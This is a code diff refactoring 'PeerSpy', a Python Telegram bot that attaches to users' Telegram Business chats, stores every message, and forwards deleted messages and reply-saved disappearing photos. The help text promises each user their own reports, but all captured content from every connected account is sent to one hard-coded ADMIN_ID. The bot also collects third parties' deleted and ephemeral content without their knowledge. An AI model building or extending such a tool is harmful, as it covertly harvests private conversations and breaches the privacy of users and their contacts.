@@ -6,7 +6,7 @@ import sqlite3
 from flask import Flask
 from threading import Thread
 from datetime import datetime
-from aiogram import Bot, Dispatcher, types, F
+from aiogram import Bot, Dispatcher, types, F, Router
 from aiogram.client.default import DefaultBotProperties
 from aiogram.filters import Command
 from aiogram.utils.keyboard import InlineKeyboardBuilder
@@ -29,7 +29,7 @@ def init_db():
 # --- ВЕБ-СЕРВЕР ---
 app = Flask('')
 @app.route('/')
-def home(): return "PeerSpy System: ONLINE"
+def home(): return "PeerSpy Online"
 
 def run_web():
     app.run(host='0.0.0.0', port=os.environ.get("PORT", 8080))
@@ -37,44 +37,37 @@ def run_web():
 # --- БОТ ---
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp = Dispatcher()
+router = Router() # Используем роутер для совместимости
 
 class AdminStates(StatesGroup):
     waiting_for_broadcast = State()
 
-# --- КНОПКИ ---
-def get_main_kb(user_id):
-    builder = InlineKeyboardBuilder()
-    builder.row(types.InlineKeyboardButton(text="🛠 Как подключить?", callback_data="how_to"))
-    builder.row(types.InlineKeyboardButton(text="📊 Мой профиль", callback_data="my_profile"))
-    if user_id == ADMIN_ID:
-        builder.row(types.InlineKeyboardButton(text="👑 Админ-панель", callback_data="admin_main"))
-    return builder.as_markup()
-
 # --- ОБРАБОТЧИКИ ---
 
-@dp.message(Command("start"))
+@router.message(Command("start"))
 async def cmd_start(message: types.Message):
-    # Сохраняем юзера
     conn = sqlite3.connect('bot_data.db')
     cur = conn.cursor()
     cur.execute("INSERT OR IGNORE INTO users VALUES (?, ?, ?)", (message.from_user.id, message.from_user.username, str(datetime.now())))
     conn.commit()
     conn.close()
     
-    welcome_text = (
+    kb = InlineKeyboardBuilder()
+    kb.row(types.InlineKeyboardButton(text="🚀 Как подключить?", callback_data="help"))
+    if message.from_user.id == ADMIN_ID:
+        kb.row(types.InlineKeyboardButton(text="⚙️ Админка", callback_data="admin"))
+    
+    await message.answer(
         f"👋 <b>Привет, {message.from_user.first_name}!</b>\n\n"
-        "Добро пожаловать в <b>PeerSpy</b> — профессиональный инструмент мониторинга Telegram Business.\n\n"
-        "🛡 <b>Что я умею:</b>\n"
-        "├ Сохраняю исчезающие фото\n"
-        "├ Ловлю удаленные сообщения\n"
-        "└ Фиксирую изменения текста\n\n"
-        "<i>Нажми кнопку ниже, чтобы начать настройку:</i>"
+        "Я — <b>PeerSpy</b>. Твоя система мониторинга Telegram Business запущена.\n\n"
+        "🛡 <b>Функции:</b>\n"
+        "• Сохранение фото (ответь на него)\n"
+        "• Лог удалений и правок", 
+        reply_markup=kb.as_markup()
     )
-    await message.answer(welcome_text, reply_markup=get_main_kb(message.from_user.id))
 
-# ОБРАБОТЧИК БИЗНЕС-СООБЩЕНИЙ
-@dp.business_message()
-async def biz_msg(message: types.Message):
+# Универсальная функция для сообщений
+async def biz_handler(message: types.Message):
     conn = sqlite3.connect('bot_data.db')
     cur = conn.cursor()
     txt = message.text or message.caption or "[Медиа]"
@@ -82,7 +75,6 @@ async def biz_msg(message: types.Message):
     conn.commit()
     conn.close()
 
-    # Перехват фото по реплаю
     if message.reply_to_message and message.reply_to_message.photo:
         f_id = message.reply_to_message.photo[-1].file_id
         async with aiohttp.ClientSession() as s:
@@ -91,67 +83,52 @@ async def biz_msg(message: types.Message):
                 if res.get("ok"):
                     path = res["result"]["file_path"]
                     async with s.get(f"https://api.telegram.org/file/bot{TOKEN}/{path}") as fr:
-                        photo = types.BufferedInputFile(await fr.read(), filename="spy_photo.jpg")
-                        await bot.send_photo(ADMIN_ID, photo, caption="📸 <b>Фото перехвачено!</b>")
+                        await bot.send_photo(ADMIN_ID, types.BufferedInputFile(await fr.read(), filename="s.jpg"), caption="📸 <b>Фото спасено!</b>")
 
-# УДАЛЕНИЯ И ПРАВКИ (универсальный синтаксис)
-@dp.business_edited_message()
-async def biz_edit(message: types.Message):
-    conn = sqlite3.connect('bot_data.db')
-    cur = conn.cursor()
-    cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(message.message_id),))
-    old = cur.fetchone()
-    if old:
-        await bot.send_message(ADMIN_ID, f"✏️ <b>Изменение в чате:</b>\n\n<b>Было:</b> {old[0]}\n<b>Стало:</b> {message.text}")
-    conn.close()
-
-@dp.business_deleted_messages()
-async def biz_delete(event: types.BusinessMessagesDeleted):
+# Функция для удалений
+async def delete_handler(event: types.BusinessMessagesDeleted):
     conn = sqlite3.connect('bot_data.db')
     cur = conn.cursor()
     for m_id in event.message_ids:
         cur.execute("SELECT text FROM messages WHERE msg_id=?", (str(m_id),))
         res = cur.fetchone()
         if res:
-            await bot.send_message(ADMIN_ID, f"🗑 <b>Удалено сообщение:</b>\n\n<code>{res[0]}</code>")
+            await bot.send_message(ADMIN_ID, f"🗑 <b>Удалено:</b>\n{res[0]}")
     conn.close()
 
-# --- CALLBACKS ---
-@dp.callback_query(F.data == "how_to")
-async def cb_help(c: types.CallbackQuery):
-    text = (
-        "<b>🚀 Как подключить мониторинг:</b>\n\n"
-        "1. Зайди в <b>Настройки</b> -> <b>Telegram Business</b>.\n"
-        "2. Выбери пункт <b>Чат-боты</b>.\n"
-        "3. Нажми <b>Подключить бота</b> и выбери меня.\n"
-        "4. Обязательно разреши <b>'Доступ к сообщениям'</b>.\n\n"
-        "✅ После этого я начну присылать отчеты сюда!"
-    )
-    await c.message.answer(text)
-    await c.answer()
+# --- РЕГИСТРАЦИЯ СОБЫТИЙ (САМЫЙ СОВМЕСТИМЫЙ СПОСОБ) ---
+router.business_message.register(biz_handler)
+router.business_edited_message.register(biz_handler)
+router.business_deleted_messages.register(delete_handler)
 
-@dp.callback_query(F.data == "admin_main")
-async def cb_admin(c: types.CallbackQuery):
+# --- АДМИНКА ---
+@router.callback_query(F.data == "help")
+async def h(c: types.CallbackQuery):
+    await c.message.answer("<b>Инструкция:</b>\n1. Настройки -> Telegram Business -> Чат-боты\n2. Добавь меня и включи доступ к сообщениям."); await c.answer()
+
+@router.callback_query(F.data == "admin")
+async def adm(c: types.CallbackQuery):
     conn = sqlite3.connect('bot_data.db'); cur = conn.cursor(); cur.execute("SELECT COUNT(*) FROM users"); count = cur.fetchone()[0]; conn.close()
-    b = InlineKeyboardBuilder(); b.row(types.InlineKeyboardButton(text="📢 Рассылка", callback_data="start_bc"))
-    await c.message.answer(f"<b>⚙️ Админ-панель</b>\n\nВсего пользователей: <b>{count}</b>", reply_markup=b.as_markup())
-    await c.answer()
+    b = InlineKeyboardBuilder(); b.row(types.InlineKeyboardButton(text="📢 Рассылка", callback_data="bc"))
+    await c.message.answer(f"📊 Юзеров: {count}", reply_markup=b.as_markup()); await c.answer()
 
-@dp.callback_query(F.data == "start_bc")
-async def bc_init(c: types.CallbackQuery, state: FSMContext):
-    await c.message.answer("Введите текст сообщения для всех пользователей:"); await state.set_state(AdminStates.waiting_for_broadcast); await c.answer()
+@router.callback_query(F.data == "bc")
+async def bc_s(c: types.CallbackQuery, state: FSMContext):
+    await c.message.answer("Пиши текст рассылки:"); await state.set_state(AdminStates.waiting_for_broadcast); await c.answer()
 
-@dp.message(AdminStates.waiting_for_broadcast)
-async def bc_send(m: types.Message, state: FSMContext):
+@router.message(AdminStates.waiting_for_broadcast)
+async def bc_f(m: types.Message, state: FSMContext):
     conn = sqlite3.connect('bot_data.db'); cur = conn.cursor(); cur.execute("SELECT user_id FROM users"); users = cur.fetchall(); conn.close()
     for u in users:
         try: await bot.send_message(u[0], m.text)
         except: pass
-    await m.answer("✅ Рассылка завершена!"); await state.clear()
+    await m.answer("✅ Готово!"); await state.clear()
 
 async def main():
     init_db()
+    dp.include_router(router)
     Thread(target=run_web).start()
+    print("🚀 БОТ ЗАПУЩЕН!")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
